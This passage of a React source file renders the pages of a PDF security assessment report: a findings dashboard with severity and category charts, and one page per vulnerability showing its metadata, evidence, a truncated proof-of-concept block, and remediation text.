                    </View>
                    <View style={[styles.legendRow, { marginBottom: 0 }]}>
                        <View style={[styles.legendDot, { backgroundColor: colors.info }]} />
                        <Text style={[styles.legendLabel, { color: colors.info }]}>Info</Text>
                        <Text style={styles.legendDesc}>Informational finding, defense-in-depth</Text>
                    </View>
                </View>

                <View style={styles.footer} fixed>
                    <Text style={styles.footerText}>Matrix Security Assessment</Text>
                    <Text style={styles.footerText} render={({ pageNumber, totalPages }) =>
                        `Page ${pageNumber} of ${totalPages}`
                    } />
                </View>
            </Page>

            {/* ============================================================ */}
            {/* PAGES 3+: TECHNICAL FINDINGS                                 */}
            {/* ============================================================ */}
            <Page size="A4" style={styles.page}>
                <View style={styles.header}>
                    <Text style={styles.headerTitle}>Technical Findings</Text>
                    <Text style={styles.headerMeta}>{activeFindings.length} vulnerabilities</Text>
                </View>

                {/* DASHBOARD: Pie Chart + Category Bars */}
                <View style={{ marginBottom: 25, backgroundColor: colors.surface, padding: 20, borderRadius: 8 }}>
                    <Text style={{ fontSize: 10, color: colors.textMuted, marginBottom: 20, textTransform: 'uppercase', letterSpacing: 1 }}>
                        Findings Overview
                    </Text>

                    <View style={{ flexDirection: 'row', gap: 40, marginBottom: 25 }}>
                        {/* Left: Severity Pie Chart */}
                        <View style={{ alignItems: 'center', width: 140 }}>
                            <View style={{ position: 'relative', width: 100, height: 100 }}>
                                <Svg width="100" height="100" viewBox="0 0 100 100">
                                    {pieData.map((slice, i) => (
                                        slice.isFull ? (
                                            <Rect key={i} x="0" y="0" width="100" height="100" rx="50" fill={slice.color} />
                                        ) : (
                                            <Path
                                                key={i}
                                                d={describeArc(50, 50, 50, slice.start, slice.end)}
                                                fill={slice.color}
                                            />
                                        )
                                    ))}
                                    {/* Donut Hole */}
                                    <Rect x="25" y="25" width="50" height="50" rx="25" fill={colors.surface} />
                                </Svg>
                                {/* Center Text */}
                                <View style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, alignItems: 'center', justifyContent: 'center' }}>
                                    <Text style={{ fontSize: 20, fontFamily: 'Helvetica-Bold', color: colors.text }}>{totalFindings}</Text>
                                    <Text style={{ fontSize: 8, color: colors.textMuted }}>Total</Text>
                                </View>
                            </View>
                        </View>

                        {/* Right: Legend & Stats */}
                        <View style={{ flex: 1, justifyContent: 'center', gap: 8 }}>
                            {[
                                { label: 'Critical', count: counts.critical, color: colors.critical },
                                { label: 'High', count: counts.high, color: colors.high },
                                { label: 'Medium', count: counts.medium, color: colors.medium },
                                { label: 'Low / Info', count: counts.low + counts.info, color: colors.low },
                            ].map((item, i) => (
                                <View key={i} style={{ flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between' }}>
                                    <View style={{ flexDirection: 'row', alignItems: 'center', gap: 8 }}>
                                        <View style={{ width: 8, height: 8, borderRadius: 2, backgroundColor: item.color }} />
                                        <Text style={{ fontSize: 10, color: colors.text }}>{item.label}</Text>
                                    </View>
                                    <Text style={{ fontSize: 10, fontFamily: 'Helvetica-Bold', color: colors.text }}>{item.count}</Text>
                                </View>
                            ))}
                        </View>
                    </View>

                    {/* Divider */}
                    <View style={{ height: 1, backgroundColor: colors.border, marginBottom: 15 }} />

                    {/* Bottom: Top Categories Bar Chart */}
                    <Text style={{ fontSize: 9, color: colors.textMuted, marginBottom: 12, textTransform: 'uppercase' }}>
                        Top Vulnerability Categories
                    </Text>
                    <View style={{ gap: 8 }}>
                        {sortedCategories.map((cat, i) => (
                            <View key={i}>
                                <View style={{ flexDirection: 'row', justifyContent: 'space-between', marginBottom: 4 }}>
                                    <Text style={{ fontSize: 9, color: colors.text }}>{truncateText(cat.name, 40)}</Text>
                                    <Text style={{ fontSize: 9, fontFamily: 'Helvetica-Bold' }}>{cat.count}</Text>
                                </View>
                                <View style={{ height: 4, backgroundColor: colors.surfaceLight, borderRadius: 2 }}>
                                    <View style={{
                                        width: `${(cat.count / (sortedCategories[0]?.count || 1)) * 100}%`,
                                        height: 4,
                                        backgroundColor: colors.accent,
                                        borderRadius: 2
                                    }} />
                                </View>
                            </View>
                        ))}
                    </View>
                </View>

                {activeFindings.length === 0 && (
                    <View style={{ padding: 30, backgroundColor: colors.surface, borderRadius: 8, alignItems: 'center' }}>
                        <Text style={{ color: colors.low, fontSize: 14 }}>✓ No vulnerabilities detected</Text>
                        <Text style={{ color: colors.textMuted, marginTop: 8 }}>The target system passed all security checks.</Text>
                    </View>
                )}

                <View style={styles.footer} fixed>
                    <Text style={styles.footerText}>Matrix Security Assessment - Confidential</Text>
                    <Text style={styles.footerText} render={({ pageNumber, totalPages }) =>
                        `Page ${pageNumber} of ${totalPages}`
                    } />
                </View>
            </Page>

            {/* INDIVIDUAL FINDING PAGES - ONE PER PAGE */}
            {activeFindings.length > 0 && (
                activeFindings.map((vuln, index) => {
                    const effectiveSev = getEffectiveSeverity(vuln);
                    const hasMismatch = effectiveSev !== vuln.severity;
                    const sevColor = effectiveSev === 'critical' ? colors.critical :
                        effectiveSev === 'high' ? colors.high :
                            effectiveSev === 'medium' ? colors.medium : colors.low;

                    // Truncate PoC to max 15 lines
                    const pocCode = getPoCTemplate(vuln);
                    const pocLines = pocCode.split('\n');
                    const truncatedPoC = pocLines.length > 15
                        ? pocLines.slice(0, 15).join('\n') + '\n# ... [truncated]'
                        : pocCode;

                    return (
                        <Page key={vuln.id} size="A4" style={styles.page}>
                            <View style={[styles.findingCard, { marginBottom: 0 }]}>
                                {/* Header */}
                                <View style={[styles.findingHeader, {
                                    borderLeftWidth: 4,
                                    borderLeftColor: sevColor
                                }]}>
                                    <View style={{ flex: 1 }}>
                                        <Text style={styles.findingId}>
                                            Finding #{index + 1} • MTX-{String(scan.id).padStart(3, '0')}-{String(vuln.id).padStart(4, '0')}
                                        </Text>
                                        <Text style={styles.findingTitle}>{vuln.title || vuln.vulnerability_type.replace(/_/g, ' ')}</Text>
                                    </View>

                                    <View style={{ flexDirection: 'row', alignItems: 'center' }}>
                                        <View style={[styles.severityBadge, { backgroundColor: sevColor }]}>
                                            <Text style={{ color: '#FFFFFF', fontSize: 9, fontFamily: 'Helvetica-Bold' }}>
                                                {effectiveSev.toUpperCase()}{hasMismatch ? '*' : ''}
                                            </Text>
                                        </View>
                                        <View style={styles.cvssBadge}>
                                            <Text style={{ color: colors.text, fontSize: 9 }}>
                                                CVSS {getDisplayCVSS(vuln).score.toFixed(1)}
                                            </Text>
                                        </View>
                                    </View>
                                </View>

                                {/* Body */}
                                <View style={styles.findingBody}>
                                    {/* Meta */}
                                    <View style={styles.metaGrid}>
                                        <View style={styles.metaItem}>
                                            <Text style={styles.metaLabel}>CWE ID</Text>
                                            <Text style={styles.metaValue}>{vuln.cwe_id || 'N/A'}</Text>
                                        </View>
                                        <View style={styles.metaItem}>
                                            <Text style={styles.metaLabel}>OWASP Category</Text>
                                            <Text style={styles.metaValue}>{vuln.owasp_category || 'N/A'}</Text>
                                        </View>
                                        <View style={styles.metaItem}>
                                            <Text style={styles.metaLabel}>Confidence</Text>
                                            <Text style={[
                                                styles.metaValue,
                                                formatConfidence(vuln.ai_confidence).value === 0 ? { color: colors.medium } : {}
                                            ]}>
                                                {formatConfidence(vuln.ai_confidence).label}
                                            </Text>
                                        </View>
                                        <View style={styles.metaItem}>
                                            <Text style={styles.metaLabel}>Detected By</Text>
                                            <Text style={styles.metaValue}>{vuln.detected_by || 'Matrix AI'}</Text>
                                        </View>
                                    </View>

                                    {/* Description */}
                                    <Text style={styles.sectionLabel}>Description</Text>
                                    <Text style={styles.descText}>{vuln.description}</Text>

                                    {/* Evidence */}
                                    {vuln.evidence && (
                                        <View wrap={false}>
                                            <Text style={styles.sectionLabel}>Technical Evidence</Text>
                                            <View style={styles.codeBlock}>
                                                <Text style={styles.codeText}>{formatEvidence(vuln.evidence, vuln)}</Text>
                                            </View>
                                        </View>
                                    )}

                                    {/* PoC for High/Critical */}
                                    {(vuln.severity === 'critical' || vuln.severity === 'high') && (
                                        <View wrap={false}>
                                            <Text style={[styles.sectionLabel, { color: colors.critical }]}>
                                                ⚠️ Proof of Concept
                                            </Text>
                                            <View style={styles.pocBlock}>
                                                <Text style={styles.pocText}>{truncatedPoC}</Text>
                                            </View>
                                        </View>
                                    )}

                                    {/* Remediation */}
                                    <View wrap={false}>
                                        <Text style={[styles.sectionLabel, { color: colors.low }]}>✓ Remediation</Text>
                                        <View style={styles.remediationBlock}>
                                            <Text style={[styles.descText, { color: colors.text }]}>
                                                {vuln.remediation || 'Implement appropriate security controls based on industry best practices.'}
                                            </Text>
                                        </View>
                                    </View>
                                </View>
                            </View>

                            <View style={styles.footer} fixed>
                                <Text style={styles.footerText}>Matrix Security Assessment - Confidential</Text>
                                <Text style={styles.footerText} render={({ pageNumber, totalPages }) =>
                                    `Page ${pageNumber} of ${totalPages}`
                                } />
                            </View>
                        </Page>
                    );
                })
            )}
        </Document >
    );
};

export default PDFReport;
